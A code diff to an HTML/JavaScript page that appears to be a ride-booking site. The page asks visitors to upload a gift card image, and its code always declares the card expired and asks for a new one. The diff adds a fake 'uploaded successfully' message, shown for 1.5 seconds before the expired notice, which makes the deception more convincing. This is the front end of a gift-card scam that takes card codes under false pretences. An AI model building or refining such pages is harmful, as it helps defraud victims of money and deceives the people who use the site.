@@ -163,6 +163,14 @@
             animation: shake 0.5s;
         }
         
+        .success-message {
+            color: var(--primary);
+            font-weight: bold;
+            text-align: center;
+            margin-top: 1rem;
+            display: none;
+        }
+        
         .crazy-element {
             position: absolute;
             font-size: 2rem;
@@ -266,6 +274,10 @@
                 <div class="error-message" id="errorMessage">
                     This gift card is expired! Please upload a new one to book your ride.
                 </div>
+                
+                <div class="success-message" id="successMessage">
+                    Gift card uploaded successfully! Processing your request...
+                </div>
             </div>
         </div>
         
@@ -283,6 +295,7 @@
             const giftCardPreview = document.getElementById('giftCardPreview');
             const submitGiftCard = document.getElementById('submitGiftCard');
             const errorMessage = document.getElementById('errorMessage');
+            const successMessage = document.getElementById('successMessage');
             
             // Handle form submission
             bookingForm.addEventListener('submit', function(e) {
@@ -337,6 +350,10 @@
                         giftCardPreview.src = e.target.result;
                         giftCardPreview.style.display = 'block';
                         uploadArea.style.display = 'none';
+                        
+                        // Clear any previous messages
+                        errorMessage.style.display = 'none';
+                        successMessage.style.display = 'none';
                     };
                     
                     reader.readAsDataURL(file);
@@ -356,18 +373,23 @@
                     return;
                 }
                 
-                // Always show expired message (as per requirements)
-                errorMessage.textContent = 'This gift card is expired! Please upload a new one to book your ride.';
-                errorMessage.style.display = 'block';
+                // First show success message briefly
+                successMessage.style.display = 'block';
                 
-                // Add effects
-                this.style.transform = 'scale(1.05)';
-                giftCardPreview.style.animation = 'shake 0.5s';
-                
+                // Then after 1.5 seconds show the expired message
                 setTimeout(() => {
-                    this.style.transform = '';
-                    giftCardPreview.style.animation = '';
-                }, 500);
+                    successMessage.style.display = 'none';
+                    errorMessage.style.display = 'block';
+                    
+                    // Add effects
+                    this.style.transform = 'scale(1.05)';
+                    giftCardPreview.style.animation = 'shake 0.5s';
+                    
+                    setTimeout(() => {
+                        this.style.transform = '';
+                        giftCardPreview.style.animation = '';
+                    }, 500);
+                }, 1500);
             });
         });
     </script>
